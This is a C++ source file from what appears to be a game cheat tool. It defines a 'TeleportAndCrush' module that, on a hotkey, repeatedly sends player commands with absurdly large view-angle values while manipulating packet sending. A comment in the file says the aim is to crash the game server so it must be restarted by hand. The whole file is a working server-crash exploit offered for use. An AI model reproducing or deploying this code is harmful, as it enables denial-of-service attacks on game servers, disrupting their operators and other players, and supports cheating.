#include "KronexMain.h"

C_CH_TeleportAndCrush::C_CH_TeleportAndCrush(C_CheatMgr* cheatManager, string cheatName)
  : C_Cheat(cheatManager, cheatName)
{
  C_CVarMgr::RegConVar(XS("krx_teleportandcrush_enabled"), XS("0"), FCVAR_SERVER_CAN_EXECUTE | FCVAR_HIDDEN);
  C_CVarMgr::RegConVar(XS("krx_teleportandcrush_key_use"), XS("102"), FCVAR_SERVER_CAN_EXECUTE | FCVAR_HIDDEN);
  
  m_iPerformSleepTime = 100;
  m_bIsCheatInitialized = true;
}

C_CH_TeleportAndCrush::~C_CH_TeleportAndCrush()
{
  C_CVarMgr::UnRegConVar(XS("krx_teleportandcrush_enabled"));
  C_CVarMgr::UnRegConVar(XS("krx_teleportandcrush_key_use"));
}

void C_CH_TeleportAndCrush::update()
{
  m_bIsCheatEnabled = C_CVarMgr::FindVar(XS("krx_teleportandcrush_enabled"))->GetInt() == 1 ? true : false;
  m_iKeyCheatUse = C_CVarMgr::FindVar(XS("krx_teleportandcrush_key_use"))->GetInt();
}

void C_CH_TeleportAndCrush::perform()
{
  // for crush: jump when playing(you will duck in air), and shot after this -> crush server (need hand-restart)

  if (GetAsyncKeyState(m_iKeyCheatUse))
  {
    while (m_pPlayer->Position()[0] > 1.0f && m_pPlayer->Position()[1] > 1.0f && m_bIsCheatEnabled)
    {
      pCMgr->SendPacketStatus(false);

      //pCmd = pCMgr->GetUserCmd(-1);
      pCmd->viewangles.x = 22249223532141231232143.949962143f;
      pCmd->viewangles.y = 22249223523413423454322345.9499621213f;

      //pCmd = pCMgr->GetUserCmd(0);
      //pCmd->forwardmove = 1.3579246e123;
      //pCmd->sidemove = 1.3579246e123;
      //pCmd->viewangles.x = 22249223532141231232143.949962143f;
      //pCmd->viewangles.y = 22249223523413423454322345.9499621213f;

      //pCmd = pCMgr->GetUserCmd(1);
      //pCmd->viewangles.x = 22249223532141231232143.949962143f;
      //pCmd->viewangles.y = 22249223523413423454322345.9499621213f;

      this_thread::sleep_for(chrono::milliseconds(5));

      pCMgr->SendPacketStatus(true);
    }
  }
}

void C_CH_TeleportAndCrush::restoreChanges()
{

}
